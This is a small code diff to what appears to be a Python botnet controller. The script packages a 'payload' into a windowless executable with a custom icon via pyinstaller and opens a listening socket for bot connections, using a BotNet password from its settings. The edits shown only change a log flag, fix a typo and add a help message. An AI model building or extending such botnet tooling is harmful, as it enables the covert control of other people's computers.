@@ -177,7 +177,7 @@ def post_cmd():
             else:
                 print_warn("TO MAKE THE PAYLOAD SMALLER, YOU'D BETTER INSTALL UPX AT https://upx.github.io/")
             try:
-                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w -i ./Resource/icon.ico --log-level FATAL --clean"
+                basic_command = f"pyinstaller -p {path[4]}/Lib/site-packages -F {name}.py {upx_command} -w -i ./Resource/icon.ico --log-level CRITICAL --clean"
                 system(basic_command)
             except Exception as e:
                 print_error(e)
@@ -575,8 +575,9 @@ if __name__ == '__main__':
     frpport = check_input("frp_port", "int_mode")
     buffsize = settings_data['BotNet']['Buffsize'] # Buffsize
     Password = settings_data['BotNet']['Password'] # Password of the botnet
-    print_warn("You must make sure that this host is on at anytime to recive connection")
+    print_warn("You must make sure that this host is on at anytime to recieve connection")
     print_normal(f"Start listening on {ip} : {port}")
+    print_normal('Type "help" to get help')
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
     s.listen(5)  # Maximum number of queued connections
